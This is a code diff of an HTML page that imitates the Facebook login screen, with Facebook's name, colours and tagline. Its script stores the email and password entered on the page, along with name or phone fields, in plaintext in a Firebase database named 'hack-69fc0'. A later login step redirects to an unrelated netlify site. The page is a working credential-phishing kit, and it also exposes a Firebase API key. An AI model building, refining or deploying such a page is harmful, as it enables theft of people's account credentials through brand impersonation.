@@ -20,7 +20,8 @@
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             padding: 20px;
-            width: 396px;
+            width: 90%; /* Responsive width */
+            max-width: 396px; /* Max width for larger screens */
         }
         h1 {
             color: #1877f2;
@@ -35,13 +36,14 @@
             margin-bottom: 12px;
             text-align: center;
         }
-        input[type="text"], input[type="password"], input[type="email"], input[type="tel"] {
+        input[type="text"], input[type="password"], input[type="email"] {
             border: 1px solid #dddfe2;
             border-radius: 6px;
             font-size: 17px;
             padding: 14px 16px;
             width: 100%;
             margin-bottom: 12px;
+            box-sizing: border-box; /* Include padding and border in element's total width */
         }
         button {
             background-color: #1877f2;
@@ -54,6 +56,7 @@
             width: 100%;
             cursor: pointer;
             margin-bottom: 12px;
+            transition: background-color 0.3s; /* Smooth transition */
         }
         button:hover {
             background-color: #166fe5;
@@ -89,6 +92,9 @@
             font-size: 14px;
             margin-bottom: 12px;
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -96,23 +102,32 @@
         <h1>facebook</h1>
         <p>Connect with friends and the world around you on Facebook.</p>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="Username" required>
-            <input type="email" id="email" placeholder="Email" required>
-            <input type="tel" id="phone" placeholder="Phone Number" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <div id="error" class="error"></div>
-            <button id="submit" type="submit">Log In</button>
+            <input type="email" id="loginEmail" placeholder="Email" required>
+            <input type="password" id="loginPassword" placeholder="Password" required>
+            <div id="loginError" class="error"></div>
+            <button type="submit">Log In</button>
         </form>
         <a href="#" class="forgot-password">Forgot password?</a>
         <div class="divider"></div>
-        <button class="create-account">Create New Account</button>
+        <button id="showCreateAccount" class="create-account">Create New Account</button>
+        
+        <form id="createAccountForm" class="hidden">
+            <input type="text" id="firstName" placeholder="First name" required>
+            <input type="text" id="lastName" placeholder="Last name" required>
+            <input type="email" id="newEmail" placeholder="Email address" required>
+            <input type="password" id="newPassword" placeholder="New password" required>
+            <div id="createAccountError" class="error"></div>
+            <button type="submit" class="create-account">Sign Up</button>
+            <button type="button" id="backToLogin" style="background-color: #e4e6eb; color: #333;">Back to Login</button>
+        </form>
     </div>
 
     <script type="module">
-        // Import the functions you need from the SDKs you need
+        // Import Firebase SDK
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";
+        import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";
 
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyC3taGFE2N-kU-IPDzkkltLRL6BX4TsH6Y",
             authDomain: "hack-69fc0.firebaseapp.com",
@@ -124,37 +139,87 @@
 
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
-
-        // Get a reference to the database
         const db = getDatabase(app);
 
-        document.getElementById("submit").addEventListener('click', function(e) {
-            e.preventDefault();
-            
-            // Collect user input values
-            var username = document.getElementById("username").value;
-            var email = document.getElementById("email").value;
-            var phone = document.getElementById("phone").value;
-            var password = document.getElementById("password").value;
-            var error = document.getElementById("error");
+        const loginForm = document.getElementById('loginForm');
+        const createAccountForm = document.getElementById('createAccountForm');
+        const showCreateAccountBtn = document.getElementById('showCreateAccount');
+        const backToLoginBtn = document.getElementById('backToLogin');
+        const loginError = document.getElementById('loginError');
+        const createAccountError = document.getElementById('createAccountError');
 
-            // Validate that all fields are filled
-            if (username && email && phone && password) {
-                // Set user data in Firebase
-                set(ref(db, 'users/' + username), {
-                    username: username,
-                    email: email,
-                    phoneNumber: phone,
-                    password: password
+        // Sign-up event handler
+        createAccountForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const newEmail = document.getElementById('newEmail').value;
+            const newPassword = document.getElementById('newPassword').value;
+
+            if (firstName && lastName && newEmail && newPassword) {
+                set(ref(db, 'users/' + newEmail.replace('.', ',')), {
+                    firstName: firstName,
+                    lastName: lastName,
+                    email: newEmail,
+                    password: newPassword
                 }).then(() => {
-                    alert("Login Successful!");
-                    error.textContent = '';
+                    alert('Account created successfully!');
+                    createAccountError.textContent = '';
+                    createAccountForm.reset(); // Clear form after submission
                 }).catch((error) => {
-                    alert("Error: " + error.message);
+                    createAccountError.textContent = 'Error: ' + error.message;
                 });
             } else {
-                error.textContent = 'Please fill all fields.';
+                createAccountError.textContent = 'Please fill in all fields.';
             }
+        });
+
+        // Login event handler
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+
+            if (email && password) {
+                const dbRef = ref(db);
+                get(child(dbRef, `users/${email.replace('.', ',')}`)).then((snapshot) => {
+                    if (snapshot.exists()) {
+                        const userData = snapshot.val();
+                        if (userData.password === password) {
+                            alert('Login successful!');
+                            loginError.textContent = '';
+                            window.location.href = "https://rxwather.netlify.app/"; // Redirect to the new page
+                        } else {
+                            loginError.textContent = 'Incorrect password.';
+                        }
+                    } else {
+                        loginError.textContent = 'User does not exist.';
+                    }
+                }).catch((error) => {
+                    loginError.textContent = 'Error: ' + error.message;
+                });
+            } else {
+                loginError.textContent = 'Please enter both email and password.';
+            }
+        });
+
+        // Toggle forms
+        showCreateAccountBtn.addEventListener('click', function() {
+            loginForm.classList.add('hidden');
+            showCreateAccountBtn.classList.add('hidden');
+            createAccountForm.classList.remove('hidden');
+        });
+
+        backToLoginBtn.addEventListener('click', function() {
+            createAccountForm.classList.add('hidden');
+            loginForm.classList.remove('hidden');
+            showCreateAccountBtn.classList.remove('hidden');
+        });
+
+        // Forgot password link event
+        document.querySelector('.forgot-password').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Forgot Password link clicked!');
         });
     </script>
 </body>
